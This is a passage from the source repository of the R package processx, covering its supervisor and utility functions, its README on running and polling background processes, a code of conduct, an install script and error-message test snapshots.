  if (!is.null(s$stdin) && is_pipe_open(s$stdin)) {
    close_named_pipe(s$stdin)
  }
  if (!is.null(s$stdout) && is_pipe_open(s$stdout)) {
    close_named_pipe(s$stdout)
  }

  s$pid <- NULL
}


supervisor_reset <- function() {
  if (supervisor_running()) {
    supervisor_kill()
  }

  supervisor_info$pid <- NULL
  supervisor_info$stdin <- NULL
  supervisor_info$stdout <- NULL
  supervisor_info$stdin_file <- NULL
  supervisor_info$stdout_file <- NULL
}


supervisor_ensure_running <- function() {
  if (!supervisor_running()) supervisor_start()
}


supervisor_running <- function() {
  if (is.null(supervisor_info$pid)) {
    FALSE
  } else {
    TRUE
  }
}


# Tell the supervisor to watch a PID
supervisor_watch_pid <- function(pid) {
  supervisor_ensure_running()
  write_lines_named_pipe(supervisor_info$stdin, as.character(pid))
}


# Tell the supervisor to un-watch a PID
supervisor_unwatch_pid <- function(pid) {
  write_lines_named_pipe(supervisor_info$stdin, as.character(-pid))
}


# Start the supervisor process. Information about the process will be stored in
# supervisor_info. If startup fails, this function will throw an error.
supervisor_start <- function() {
  supervisor_info$stdin_file <- named_pipe_tempfile("supervisor_stdin")
  supervisor_info$stdout_file <- named_pipe_tempfile("supervisor_stdout")

  supervisor_info$stdin <- create_named_pipe(supervisor_info$stdin_file)
  supervisor_info$stdout <- create_named_pipe(supervisor_info$stdout_file)

  # Start the supervisor, passing the R process's PID to it.
  # Note: for debugging, you can add "-v" to args and use stdout="log.txt".
  p <- process$new(
    supervisor_path(),
    args = c("-p", Sys.getpid(), "-i", supervisor_info$stdin_file),
    stdout = "|",
    cleanup = FALSE
  )

  # Wait for supervisor to emit the line "Ready", which indicates it is ready
  # to receive information.
  ready <- FALSE
  cur_time <- Sys.time()
  end_time <- cur_time + 5
  while (cur_time < end_time) {
    p$poll_io(round(as.numeric(end_time - cur_time, units = "secs") * 1000))

    if (!p$is_alive()) {
      break
    }

    if (any(p$read_output_lines() == "Ready")) {
      ready <- TRUE
      break
    }

    cur_time <- Sys.time()
  }

  if (p$is_alive()) {
    close(p$get_output_connection())
  }

  # Two ways of reaching this: if process has died, or if it hasn't emitted
  # "Ready" after 5 seconds.
  if (!ready) {
    throw(new_error("processx supervisor was not ready after 5 seconds."))
  }

  supervisor_info$pid <- p$get_pid()
}


# Returns full path to the supervisor binary. Works when package is loaded the
# normal way, and when loaded with devtools::load_all().
supervisor_path <- function() {
  supervisor_name <- "supervisor"
  if (is_windows()) {
    supervisor_name <- paste0(supervisor_name, ".exe")
  }

  # Detect if package was loaded via devtools::load_all()
  dev_meta <- parent.env(environment())$.__DEVTOOLS__
  devtools_loaded <- !is.null(dev_meta)

  if (devtools_loaded) {
    subdir <- file.path("src", "supervisor")
  } else {
    subdir <- "bin"
    # Add arch (it may be ""; on Windows it may be "/X64")
    subdir <- paste0(subdir, Sys.getenv("R_ARCH"))
  }

  system.file(subdir, supervisor_name, package = "processx", mustWork = TRUE)
}
````

### `px390/processx/R/utils.R`

````r
enc2path <- function(x) {
  if (is_windows()) {
    enc2utf8(x)
  } else {
    enc2native(x)
  }
}

`%||%` <- function(l, r) if (is.null(l)) r else l

os_type <- function() {
  .Platform$OS.type
}

is_windows <- function() {
  .Platform$OS.type == "windows"
}

is_linux <- function() {
  identical(tolower(Sys.info()[["sysname"]]), "linux")
}

last_char <- function(x) {
  nc <- nchar(x)
  substring(x, nc, nc)
}

# Given a filename, return an absolute path to that file. This has two important
# differences from normalizePath(). (1) The file does not need to exist, and (2)
# the path is merely absolute, whereas normalizePath() returns a canonical path,
# which resolves symbolic links, gives canonical case, and, on Windows, may give
# short names.
#
# On Windows, the returned path includes the drive ("C:") or network server
# ("//myserver").
full_path <- function(path) {
  assert_that(is_string(path))

  # Try expanding "~"
  path <- path.expand(path)

  # If relative path, prepend current dir. On Windows, also record current
  # drive.
  if (is_windows()) {
    path <- gsub("\\", "/", path, fixed = TRUE)

    if (grepl("^[a-zA-Z]:", path)) {
      drive <- substring(path, 1, 2)
      path <- substring(path, 3)
    } else if (substring(path, 1, 2) == "//") {
      # Extract server name, like "//server", and use as drive.
      pos <- regexec("^(//[^/]*)(.*)", path)[[1]]
      drive <- substring(
        path,
        pos[2],
        attr(pos, "match.length", exact = TRUE)[2]
      )
      path <- substring(path, pos[3])

      # Must have a name, like "//server"
      if (drive == "//") {
        throw(new_error("Server name not found in network path."))
      }
    } else {
      drive <- substring(getwd(), 1, 2)

      if (substr(path, 1, 1) != "/") {
        path <- substring(file.path(getwd(), path), 3)
      }
    }
  } else {
    if (substr(path, 1, 1) != "/") path <- file.path(getwd(), path)
  }

  parts <- strsplit(path, "/")[[1]]

  # Collapse any "..", ".", and "" in path.
  i <- 2
  while (i <= length(parts)) {
    if (parts[i] == "." || parts[i] == "") {
      parts <- parts[-i]
    } else if (parts[i] == "..") {
      if (i == 2) {
        parts <- parts[-i]
      } else {
        parts <- parts[-c(i - 1, i)]
        i <- i - 1
      }
    } else {
      i <- i + 1
    }
  }

  new_path <- paste(parts, collapse = "/")
  if (new_path == "") {
    new_path <- "/"
  }

  if (is_windows()) {
    new_path <- paste0(drive, new_path)
  }

  new_path
}

vcapply <- function(X, FUN, ..., USE.NAMES = TRUE) {
  vapply(X, FUN, FUN.VALUE = character(1), ..., USE.NAMES = USE.NAMES)
}

do_echo_cmd <- function(command, args) {
  quoted <- sh_quote_smart(c("Running", command, args))

  out <- str_wrap_words(quoted, width = getOption("width") - 3)

  if ((len <- length(out)) > 1) {
    out[1:(len - 1)] <- paste0(out[1:(len - 1)], " \\")
  }
  cat(out, sep = "\n")
}

sh_quote_smart <- function(x) {
  if (!length(x)) {
    return(x)
  }
  ifelse(grepl("^[-a-zA-Z0-9/_\\.]*$", x), x, shQuote(x))
}

strrep <- function(x, times) {
  x <- as.character(x)
  if (length(x) == 0L) {
    return(x)
  }
  r <- .mapply(
    function(x, times) {
      if (is.na(x) || is.na(times)) {
        return(NA_character_)
      }
      if (times <= 0L) {
        return("")
      }
      paste0(replicate(times, x), collapse = "")
    },
    list(x = x, times = times),
    MoreArgs = list()
  )

  unlist(r, use.names = FALSE)
}

str_wrap_words <- function(words, width, indent = 0, exdent = 2) {
  word_widths <- nchar(words, type = "width")
  out <- character()

  current_width <- indent
  current_line <- strrep(" ", indent)
  first_word <- TRUE

  i <- 1
  while (i <= length(words)) {
    if (first_word) {
      current_width <- current_width + word_widths[i]
      current_line <- paste0(current_line, words[i])
      first_word <- FALSE
      i <- i + 1
    } else if (current_width + 1 + word_widths[i] <= width) {
      current_width <- current_width + word_widths[i] + 1
      current_line <- paste0(current_line, " ", words[i])
      i <- i + 1
    } else {
      out <- c(out, current_line)
      current_width <- exdent
      current_line <- strrep(" ", exdent)
      first_word <- TRUE
    }
  }

  if (!first_word) {
    out <- c(out, current_line)
  }

  out
}

set_names <- function(x, n) {
  names(x) <- n
  x
}

get_private <- function(x) {
  x$.__enclos_env__$private
}

get_tool <- function(prog) {
  if (os_type() == "windows") {
    prog <- paste0(prog, ".exe")
  }
  exe <- system.file(package = "processx", "bin", .Platform$r_arch, prog)
  if (exe == "") {
    pkgpath <- find.package("processx")
    if (basename(pkgpath) == "inst") {
      pkgpath <- dirname(pkgpath)
    }
    exe <- file.path(pkgpath, "src", "tools", prog)
    if (!file.exists(exe)) return("")
  }
  exe
}

get_id <- function() {
  paste0(
    basename(tempfile("PS")),
    "_",
    as.integer(asNamespace("base")$.Internal(Sys.time()))
  )
}

format_unix_time <- function(z) {
  structure(z, class = c("POSIXct", "POSIXt"), tzone = "GMT")
}

file_size <- function(x) {
  if (getRversion() >= "3.2.0") {
    file.info(x, extra_cols = FALSE)$size
  } else {
    file.info(x)$size
  }
}

disable_crash_dialog <- function() {
  chain_call(c_processx_disable_crash_dialog)
}

has_package <- function(pkg) {
  requireNamespace(pkg, quietly = TRUE)
}

write_raw_stdout <- function(x) {
  chain_call(c_processx_write_raw_stdout, x)
}

tty_echo_off <- function() {
  chain_call(c_processx__echo_off)
}

tty_echo_on <- function() {
  chain_call(c_processx__echo_on)
}

str_trim <- function(x) {
  sub("^\\s+", "", sub("\\s+$", "", x))
}

new_not_implemented_error <- function(message, call) {
  add_class(
    new_error(message, call. = call),
    c("not_implemented_error", "not_implemented")
  )
}

add_class <- function(obj, class) {
  class(obj) <- c(class, class(obj))
  obj
}

is_interactive <- function() {
  opt <- getOption("rlib_interactive")
  if (isTRUE(opt)) {
    TRUE
  } else if (identical(opt, FALSE)) {
    FALSE
  } else if (tolower(getOption("knitr.in.progress", "false")) == "true") {
    FALSE
  } else if (
    tolower(getOption("rstudio.notebook.executing", "false")) == "true"
  ) {
    FALSE
  } else if (identical(Sys.getenv("TESTTHAT"), "true")) {
    FALSE
  } else {
    interactive()
  }
}

make_raw_buffer <- function() {
  chunks <- list()
  total <- 0L
  list(
    push = function(raw_bytes) {
      n <- length(raw_bytes)
      if (n > 0L) {
        chunks[[length(chunks) + 1L]] <<- raw_bytes
        total <<- total + n
      }
    },
    read = function() {
      if (total == 0L) return(raw(0L))
      result <- raw(total)
      pos <- 1L
      for (chunk in chunks) {
        n <- length(chunk)
        result[pos:(pos + n - 1L)] <- chunk
        pos <- pos + n
      }
      result
    },
    done = function() {
      chunks <<- list()
      total <<- 0L
    }
  )
}

make_buffer <- function() {
  con <- file(open = "w+b")
  size <- 0L
  list(
    push = function(text) {
      size <<- size + nchar(text, type = "bytes")
      cat(text, file = con)
    },
    read = function() {
      readChar(con, size, useBytes = TRUE)
    },
    done = function() {
      close(con)
    }
  )
}

update_vector <- function(x, y = NULL) {
  if (length(y) == 0L) {
    return(x)
  }
  c(x[!(names(x) %in% names(y))], y)
}

process_env <- function(env) {
  if (is.null(names(env))) names(env) <- rep("", length(env))
  current <- env == "current" & names(env) == ""
  if (any(current)) {
    env <- update_vector(Sys.getenv(), env[!current])
  }
  enc2path(paste(names(env), sep = "=", env))
}

starts_with <- function(x, pre) {
  substr(x, 1, nchar(pre)) == pre
}

ends_with <- function(x, post) {
  l <- nchar(post)
  substr(x, nchar(x) - l + 1, nchar(x)) == post
}
````

### `px390/processx/README.md`

````text

# processx

> Execute and Control System Processes

<!-- badges: start -->

[![lifecycle](https://lifecycle.r-lib.org/articles/figures/lifecycle-stable.svg)](https://lifecycle.r-lib.org/articles/stages.html)
[![R-CMD-check](https://github.com/r-lib/processx/actions/workflows/R-CMD-check.yaml/badge.svg)](https://github.com/r-lib/processx/actions/workflows/R-CMD-check.yaml)
[![](https://www.r-pkg.org/badges/version/processx)](https://www.r-pkg.org/pkg/processx)
[![CRAN RStudio mirror
downloads](https://cranlogs.r-pkg.org/badges/processx)](https://www.r-pkg.org/pkg/processx)
[![Codecov test
coverage](https://codecov.io/gh/r-lib/processx/graph/badge.svg)](https://app.codecov.io/gh/r-lib/processx)
<!-- badges: end -->

Tools to run system processes in the background, read their standard
output and error and kill them.

processx can poll the standard output and error of a single process, or
multiple processes, using the operating system’s polling and waiting
facilities, with a timeout.

------------------------------------------------------------------------

-   [Features](#features)
-   [Installation](#installation)
-   [Usage](#usage)
    -   [Running an external process](#running-an-external-process)
        -   [Errors](#errors)
        -   [Showing output](#showing-output)
        -   [Spinner](#spinner)
        -   [Callbacks for I/O](#callbacks-for-io)
    -   [Managing external processes](#managing-external-processes)
        -   [Starting processes](#starting-processes)
        -   [Killing a process](#killing-a-process)
        -   [Standard output and error](#standard-output-and-error)
        -   [End of output](#end-of-output)
        -   [Polling the standard output and
            error](#polling-the-standard-output-and-error)
        -   [Polling multiple processes](#polling-multiple-processes)
        -   [Waiting on a process](#waiting-on-a-process)
        -   [Exit statuses](#exit-statuses)
        -   [Mixing processx and the parallel base R
            package](#mixing-processx-and-the-parallel-base-r-package)
        -   [Errors](#errors-1)
-   [Related tools](#related-tools)
-   [Code of Conduct](#code-of-conduct)
-   [License](#license)

## Features

-   Start system processes in the background and find their process id.
-   Read the standard output and error, using non-blocking connections
-   Poll the standard output and error connections of a single process
    or multiple processes.
-   Write to the standard input of background processes.
-   Check if a background process is running.
-   Wait on a background process, or multiple processes, with a timeout.
-   Get the exit status of a background process, if it has already
    finished.
-   Kill background processes.
-   Kill background process, when its associated object is garbage
    collected.
-   Kill background processes and all their child processes.
-   Works on Linux, macOS and Windows.
-   Lightweight, it only depends on the also lightweight R6 and ps
    packages.

## Installation

Install the stable version from CRAN:

``` r
install.packages("processx")
```

If you need the development version, install it from GitHub:

``` r
pak::pak("r-lib/processx")
```

## Usage

``` r
library(processx)
```

> Note: the following external commands are usually present in macOS and
> Linux systems, but not necessarily on Windows. We will also use the
> `px` command line tool (`px.exe` on Windows), that is a very simple
> program that can produce output to `stdout` and `stderr`, with the
> specified timings.

``` r
px <- paste0(
  system.file(package = "processx", "bin", "px"),
  system.file(package = "processx", "bin", .Platform$r_arch, "px.exe")
)
px
```

    #> [1] "/Users/gaborcsardi/Library/R/arm64/4.5/library/processx/bin/px"

### Running an external process

The `run()` function runs an external command. It requires a single
command, and a character vector of arguments. You don’t need to quote
the command or the arguments, as they are passed directly to the
operating system, without an intermediate shell.

``` r
run("echo", "Hello R!")
```

    #> $status
    #> [1] 0
    #> 
    #> $stdout
    #> [1] "Hello R!\n"
    #> 
    #> $stderr
    #> [1] ""
    #> 
    #> $timeout
    #> [1] FALSE

Short summary of the `px` binary we are using extensively below:

``` r
result <- run(px, "--help", echo = TRUE)
```

    #> Usage: px [command arg] [command arg] ...
    #> 
    #> Commands:
    #>   sleep  <seconds>           -- sleep for a number os seconds
    #>   out    <string>            -- print string to stdout
    #>   err    <string>            -- print string to stderr
    #>   outln  <string>            -- print string to stdout, add newline
    #>   errln  <string>            -- print string to stderr, add newline
    #>   errflush                   -- flush stderr stream
    #>   cat    <filename>          -- print file to stdout (use '<stdin>' for standard input)
    #>   return <exitcode>          -- return with exitcode
    #>   writefile <path> <string>  -- write to file
    #>   write <fd> <string>        -- write to file descriptor
    #>   echo <fd1> <fd2> <nbytes>  -- echo from fd to another fd
    #>   getenv <var>               -- environment variable to stdout
    #>   rawout <hexstring>         -- write raw bytes (hex pairs) to stdout
    #>   rawerr <hexstring>         -- write raw bytes (hex pairs) to stderr

> Note: From version 3.0.1, processx does not let you specify a full
> shell command line, as this involves starting a grandchild process
> from the child process, and it is difficult to clean up the grandchild
> process when the child process is killed. The user can still start a
> shell (`sh` or `cmd.exe`) directly of course, and then proper cleanup
> is the user’s responsibility.

#### Errors

By default `run()` throws an error if the process exits with a non-zero
status code. To avoid this, specify `error_on_status = FALSE`:

``` r
run(px, c("out", "oh no!", "return", "2"), error_on_status = FALSE)
```

    #> $status
    #> [1] 2
    #> 
    #> $stdout
    #> [1] "oh no!"
    #> 
    #> $stderr
    #> [1] ""
    #> 
    #> $timeout
    #> [1] FALSE

#### Showing output

To show the output of the process on the screen, use the `echo`
argument. Note that the order of `stdout` and `stderr` lines may be
incorrect, because they are coming from two different connections.

``` r
result <- run(px,
  c("outln", "out", "errln", "err", "outln", "out again"),
  echo = TRUE)
```

    #> out
    #> out again
    #> err

If you have a terminal that support ANSI colors, then the standard error
output is shown in red.

The standard output and error are still included in the result of the
`run()` call:

``` r
result
```

    #> $status
    #> [1] 0
    #> 
    #> $stdout
    #> [1] "out\nout again\n"
    #> 
    #> $stderr
    #> [1] "err\n"
    #> 
    #> $timeout
    #> [1] FALSE

Note that `run()` is different from `system()`, and it always shows the
output of the process on R’s proper standard output, instead of writing
to the terminal directly. This means for example that you can capture
the output with `capture.output()` or use `sink()`, etc.:

``` r
out1 <- capture.output(r1 <- system("ls"))
out2 <- capture.output(r2 <- run("ls", echo = TRUE))
```

``` r
out1
```

    #> character(0)

``` r
out2
```

    #>  [1] "_pkgdown.yml"   "codecov.yml"    "DESCRIPTION"    "inst"          
    #>  [5] "LICENSE"        "LICENSE.md"     "Makefile"       "man"           
    #>  [9] "NAMESPACE"      "NEWS.md"        "processx.Rproj" "R"             
    #> [13] "README.md"      "README.Rmd"     "src"            "tests"         
    #> [17] "vignettes"

#### Spinner

The `spinner` option of `run()` puts a calming spinner to the terminal
while the background program is running. The spinner is always shown in
the first character of the last line, so you can make it work nicely
with the regular output of the background process if you like. E.g. try
this in your R terminal:

    result <- run(px,
      c("out", "  foo",
        "sleep", "1",
        "out", "\r  bar",
        "sleep", "1",
        "out", "\rX foobar\n"),
      echo = TRUE, spinner = TRUE)

#### Callbacks for I/O

`run()` can call an R function for each line of the standard output or
error of the process, just supply the `stdout_line_callback` or the
`stderr_line_callback` arguments. The callback functions take two
arguments, the first one is a character scalar, the output line. The
second one is the `process` object that represents the background
process. (See more below about `process` objects.) You can manipulate
this object in the callback, if you want. For example you can kill it in
response to an error or some text on the standard output:

``` r
cb <- function(line, proc) {
  cat("Got:", line, "\n")
  if (line == "done") proc$kill()
}
result <- run(px,
  c("outln", "this", "outln", "that", "outln", "done",
    "outln", "still here", "sleep", "10", "outln", "dead by now"), 
  stdout_line_callback = cb,
  error_on_status = FALSE,
)
```

    #> Got: this 
    #> Got: that 
    #> Got: done 
    #> Got: still here

``` r
result
```

    #> $status
    #> [1] -9
    #> 
    #> $stdout
    #> [1] "this\nthat\ndone\nstill here\n"
    #> 
    #> $stderr
    #> [1] ""
    #> 
    #> $timeout
    #> [1] FALSE

Keep in mind, that while the R callback is running, the background
process is not stopped, it is also running. In the previous example,
whether `still here` is printed or not depends on the scheduling of the
R process and the background process by the OS. Typically, it is
printed, because the R callback takes a while to run.

In addition to the line-oriented callbacks, the `stdout_callback` and
`stderr_callback` arguments can specify callback functions that are
called with output chunks instead of single lines. A chunk may contain
multiple lines (separated by `\n` or `\r\n`), or even incomplete lines.

### Managing external processes

If you need better control over possibly multiple background processes,
then you can use the R6 `process` class directly.

#### Starting processes

To start a new background process, create a new instance of the
`process` class.

``` r
p <- process$new("sleep", "20")
```

#### Killing a process

A process can be killed via the `kill()` method.

``` r
p$is_alive()
```

    #> [1] TRUE

``` r
p$kill()
```

    #> [1] TRUE

``` r
p$is_alive()
```

    #> [1] FALSE

Note that processes are finalized (and killed) automatically if the
corresponding `process` object goes out of scope, as soon as the object
is garbage collected by R:

``` r
p <- process$new("sleep", "20")
rm(p)
invisible(gc())
```

Here, the direct call to the garbage collector kills the `sleep` process
as well. See the `cleanup` option if you want to avoid this behavior.

#### Standard output and error

By default the standard output and error of the processes are ignored.
You can set the `stdout` and `stderr` constructor arguments to a file
name, and then they are redirected there, or to `"|"`, and then processx
creates connections to them. (Note that starting from processx 3.0.0
these connections are not regular R connections, because the public R
connection API was retroactively removed from R.)

The `read_output_lines()` and `read_error_lines()` methods can be used
to read complete lines from the standard output or error connections.
They work similarly to the `readLines()` base R function.

Note, that the connections have a buffer, which can fill up, if R does
not read out the output, and then the process will stop, until R reads
the connection and the buffer is freed.

> **Always make sure that you read out the standard output and/or
> error** **of the pipes, otherwise the background process will stop
> running!**

If you don’t need the standard output or error any more, you can also
close it, like this:

``` r
close(p$get_output_connection())
close(p$get_error_connection())
```

Note that the connections used for reading the output and error streams
are non-blocking, so the read functions will return immediately, even if
there is no text to read from them. If you want to make sure that there
is data available to read, you need to poll, see below.

``` r
p <- process$new(px,
  c("sleep", "1", "outln", "foo", "errln", "bar", "outln", "foobar"),
  stdout = "|", stderr = "|")
p$read_output_lines()
```

    #> character(0)

``` r
p$read_error_lines()
```

    #> character(0)

#### End of output

The standard R way to query the end of the stream for a non-blocking
connection, is to use the `isIncomplete()` function. *After a read
attempt*, this function returns `FALSE` if the connection has surely no
more data. (If the read attempt returns no data, but `isIncomplete()`
returns `TRUE`, then the connection might deliver more data in the
future.

The `is_incomplete_output()` and `is_incomplete_error()` functions work
similarly for `process` objects.

#### Polling the standard output and error

The `poll_io()` method waits for data on the standard output and/or
error of a process. It will return if any of the following events
happen:

-   data is available on the standard output of the process (assuming
    there is a connection to the standard output).
-   data is available on the standard error of the process (assuming the
    is a connection to the standard error).
-   The process has finished and the standard output and/or error
    connections were closed on the other end.
-   The specified timeout period expired.

For example the following code waits about a second for output.

``` r
p <- process$new(px, c("sleep", "1", "outln", "kuku"), stdout = "|")

## No output yet
p$read_output_lines()
```

    #> character(0)

``` r
## Wait at most 5 sec
p$poll_io(5000)
```

    #>   output    error  process 
    #>  "ready" "nopipe" "nopipe"

``` r
## There is output now
p$read_output_lines()
```

    #> [1] "kuku"

#### Polling multiple processes

If you need to manage multiple background processes, and need to wait
for output from all of them, processx defines a `poll()` function that
does just that. It is similar to the `poll_io()` method, but it takes
multiple process objects, and returns as soon as one of them have data
on standard output or error, or a timeout expires. Here is an example:

``` r
p1 <- process$new(px, c("sleep", "1", "outln", "output"), stdout = "|")
p2 <- process$new(px, c("sleep", "2", "errln", "error"), stderr = "|")

## After 100ms no output yet
poll(list(p1 = p1, p2 = p2), 100)
```

    #> $p1
    #>    output     error   process 
    #> "timeout"  "nopipe"  "nopipe" 
    #> 
    #> $p2
    #>    output     error   process 
    #>  "nopipe" "timeout"  "nopipe"

``` r
## But now we surely have something
poll(list(p1 = p1, p2 = p2), 1000)
```

    #> $p1
    #>   output    error  process 
    #>  "ready" "nopipe" "nopipe" 
    #> 
    #> $p2
    #>   output    error  process 
    #> "nopipe" "silent" "nopipe"

``` r
p1$read_output_lines()
```

    #> [1] "output"

``` r
## Done with p1
close(p1$get_output_connection())
```

    #> NULL

``` r
## The second process should have data on stderr soonish
poll(list(p1 = p1, p2 = p2), 5000)
```

    #> $p1
    #>   output    error  process 
    #> "closed" "nopipe" "nopipe" 
    #> 
    #> $p2
    #>   output    error  process 
    #> "nopipe"  "ready" "nopipe"

``` r
p2$read_error_lines()
```

    #> [1] "error"

#### Waiting on a process

As seen before, `is_alive()` checks if a process is running. The
`wait()` method can be used to wait until it has finished (or a
specified timeout expires).. E.g. in the following code `wait()` needs
to wait about 2 seconds for the `sleep` `px` command to finish.

``` r
p <- process$new(px, c("sleep", "2"))
p$is_alive()
```

    #> [1] TRUE

``` r
Sys.time()
```

    #> [1] "2025-04-26 09:34:10 CEST"

``` r
p$wait()
Sys.time()
```

    #> [1] "2025-04-26 09:34:12 CEST"

It is safe to call `wait()` multiple times:

``` r
p$wait() # already finished!
```

#### Exit statuses

After a process has finished, its exit status can be queried via the
`get_exit_status()` method. If the process is still running, then this
method returns `NULL`.

``` r
p <- process$new(px, c("sleep", "2"))
p$get_exit_status()
```

    #> NULL

``` r
p$wait()
p$get_exit_status()
```

    #> [1] 0

#### Mixing processx and the parallel base R package

In general, mixing processx (via callr or not) and parallel works fine.
If you use parallel’s ‘fork’ clusters, e.g. via
`parallel::mcparallel()`, then you might see two issues. One is that
processx will not be able to determine the exit status of some processx
processes. This is because the status is read out by parallel, and
processx will set it to `NA`. The other one is that parallel might
complain that it could not clean up some subprocesses. This is not an
error, and it is harmless, but it does hold up R for about 10 seconds,
before parallel gives up. To work around this, you can set the
`PROCESSX_NOTIFY_OLD_SIGCHLD` environment variable to a non-empty value,
before you load processx. This behavior might be the default in the
future.

#### Errors

Errors are typically signalled via non-zero exits statuses. The processx
constructor fails if the external program cannot be started, but it does
not deal with errors that happen after the program has successfully
started running.

``` r
p <- process$new("nonexistant-command-for-sure")
```

    #> Error in `process_initialize()`:
    #> ! ! Native call to `processx_exec` failed
    #> Caused by error in `chain_call(...)`:
    #> ! cannot start processx process 'nonexistant-command-for-sure' (system error 2, No such file or directory) @unix/processx.c:651 (processx_exec)

``` r
p2 <- process$new(px, c("sleep", "1", "command-does-not-exist"))
p2$wait()
p2$get_exit_status()
```

    #> [1] 5

## Related tools

-   The [`ps` package](https://ps.r-lib.org/) can query, list,
    manipulate all system processes (not just subprocesses), and
    processx uses it internally for some of its functionality. You can
    also convert a `processx::process` object to a `ps::ps_handle` with
    the `as_ps_handle()` method.

-   The [`callr` package](https://callr.r-lib.org/) uses processx to
    start another R process, and run R code in it, in the foreground or
    background.

## Code of Conduct

Please note that the processx project is released with a [Contributor
Code of Conduct](https://processx.r-lib.org/CODE_OF_CONDUCT.html). By
contributing to this project, you agree to abide by its terms.

## License

MIT © Ascent Digital Services, RStudio, Gábor Csárdi
````

### `px390/processx/inst/CODE_OF_CONDUCT.md`

````text
# Contributor Code of Conduct

As contributors and maintainers of this project, we pledge to respect all people who 
contribute through reporting issues, posting feature requests, updating documentation,
submitting pull requests or patches, and other activities.

We are committed to making participation in this project a harassment-free experience for
everyone, regardless of level of experience, gender, gender identity and expression,
sexual orientation, disability, personal appearance, body size, race, ethnicity, age, or religion.

Examples of unacceptable behavior by participants include the use of sexual language or
imagery, derogatory comments or personal attacks, trolling, public or private harassment,
insults, or other unprofessional conduct.

Project maintainers have the right and responsibility to remove, edit, or reject comments,
commits, code, wiki edits, issues, and other contributions that are not aligned to this 
Code of Conduct. Project maintainers who do not follow the Code of Conduct may be removed 
from the project team.

Instances of abusive, harassing, or otherwise unacceptable behavior may be reported by 
opening an issue or contacting one or more of the project maintainers.

This Code of Conduct is adapted from the Contributor Covenant 
(http://contributor-covenant.org), version 1.0.0, available at 
http://contributor-covenant.org/version/1/0/0/
````

### `px390/processx/src/install.libs.R`

````r
progs <- if (WINDOWS) {
  c(
    file.path("tools", c("px.exe", "interrupt.exe", "sock.exe")),
    file.path("supervisor", "supervisor.exe")
  )
} else {
  c(file.path("tools", c("px", "sock")), file.path("supervisor", "supervisor"))
}

dest <- file.path(R_PACKAGE_DIR, paste0("bin", R_ARCH))
dir.create(dest, recursive = TRUE, showWarnings = FALSE)
file.copy(progs, dest, overwrite = TRUE)

files <- Sys.glob(paste0("*", SHLIB_EXT))
dest <- file.path(R_PACKAGE_DIR, paste0('libs', R_ARCH))
dir.create(dest, recursive = TRUE, showWarnings = FALSE)
file.copy(files, dest, overwrite = TRUE)
if (file.exists("symbols.rds")) {
  file.copy("symbols.rds", dest, overwrite = TRUE)
}
````

### `px390/processx/tests/testthat.R`

````r
# This file is part of the standard setup for testthat.
# It is recommended that you do not modify it.
#
# Where should you do additional test configuration?
# Learn more about the roles of various files in:
# * https://r-pkgs.org/testing-design.html#sec-tests-files-overview
# * https://testthat.r-lib.org/articles/special-files.html

library(testthat)
library(processx)

test_check("processx", reporter = "summary")
````

### `px390/processx/tests/testthat/_snaps/Darwin/process.md`

````text
# non existing process

    Code
      process$new(tempfile())
    Condition
      Error in `process_initialize()`:
      ! ! Native call to `processx_exec` failed
      Caused by error in `chain_call(...)` at initialize.R:<line>:<col>:
      ! cannot start processx process '<tempdir>/<tempfile>' (system error 2, No such file or directory) @unix/processx.c:651 (processx_exec)

# working directory does not exist

    Code
      process$new(px, wd = tempfile())
    Condition
      Error in `process_initialize()`:
      ! ! Native call to `processx_exec` failed
      Caused by error in `chain_call(...)` at initialize.R:<line>:<col>:
      ! cannot start processx process '<path>/px' (system error 2, No such file or directory) @unix/processx.c:651 (processx_exec)
````

### `px390/processx/tests/testthat/_snaps/Darwin/run.md`

````text
# working directory does not exist

    Code
      run(px, wd = tempfile())
    Condition
      Error in `process_initialize()`:
      ! ! Native call to `processx_exec` failed
      Caused by error in `chain_call(...)` at initialize.R:<line>:<col>:
      ! cannot start processx process '<path>/px' (system error 2, No such file or directory) @unix/processx.c:651 (processx_exec)
````

### `px390/processx/tests/testthat/_snaps/Darwin/unix-sockets.md`

````text
# reading unaccepted server socket is error

    Code
      conn_read_chars(sock1)
    Condition
      Error in `processx_conn_read_chars()`:
      ! ! Native call to `processx_connection_read_chars` failed
      Caused by error in `chain_call(c_processx_connection_read_chars, con, n)` at connections.R:318:<col>:
      ! Cannot read from processx connection (system error 57, Socket is not connected) @processx-connection.c:1940 (processx__connection_read)

# errors

    Code
      conn_create_unix_socket(sock)
    Condition
      Error in `conn_create_unix_socket()`:
      ! ! Native call to `processx_connection_create_socket` failed
      Caused by error in `chain_call(c_processx_connection_create_socket, filename, encoding)` at connections.R:634:<col>:
      ! Server socket path too long: <tempdir>/<tempfile>
    Code
      conn_create_unix_socket("/dev/null")
    Condition
      Error in `conn_create_unix_socket()`:
      ! ! Native call to `processx_connection_create_socket` failed
      Caused by error in `chain_call(c_processx_connection_create_socket, filename, encoding)` at connections.R:634:<col>:
      ! Cannot bind to socket (system error 48, Address already in use) @processx-connection.c:479 (processx_connection_create_socket)
    Code
      conn_connect_unix_socket("/dev/null")
    Condition
      Error in `conn_connect_unix_socket()`:
      ! ! Native call to `processx_connection_connect_socket` failed
      Caused by error in `chain_call(c_processx_connection_connect_socket, filename, encoding)` at connections.R:656:<col>:
      ! Cannot connect to socket (system error 38, Socket operation on non-socket) @processx-connection.c:550 (processx_connection_connect_socket)
````

### `px390/processx/tests/testthat/_snaps/Linux/process.md`

````text
# non existing process

    Code
      process$new(tempfile())
    Condition
      Error in `process_initialize()`:
      ! ! Native call to `processx_exec` failed
      Caused by error in `chain_call(...)` at initialize.R:<line>:<col>:
      ! cannot start processx process '<tempdir>/<tempfile>' (system error 2, No such file or directory) @unix/processx.c:651 (processx_exec)

# working directory does not exist

    Code
      process$new(px, wd = tempfile())
    Condition
      Error in `process_initialize()`:
      ! ! Native call to `processx_exec` failed
      Caused by error in `chain_call(...)` at initialize.R:<line>:<col>:
      ! cannot start processx process '<path>/px' (system error 2, No such file or directory) @unix/processx.c:651 (processx_exec)
````

### `px390/processx/tests/testthat/_snaps/Linux/run.md`

````text
# working directory does not exist

    Code
      run(px, wd = tempfile())
    Condition
      Error in `process_initialize()`:
      ! ! Native call to `processx_exec` failed
      Caused by error in `chain_call(...)` at initialize.R:<line>:<col>:
      ! cannot start processx process '<path>/px' (system error 2, No such file or directory) @unix/processx.c:651 (processx_exec)
````

### `px390/processx/tests/testthat/_snaps/Linux/unix-sockets.md`

````text
# reading unaccepted server socket is error

    Code
      conn_read_chars(sock1)
    Condition
      Error in `processx_conn_read_chars()`:
      ! ! Native call to `processx_connection_read_chars` failed
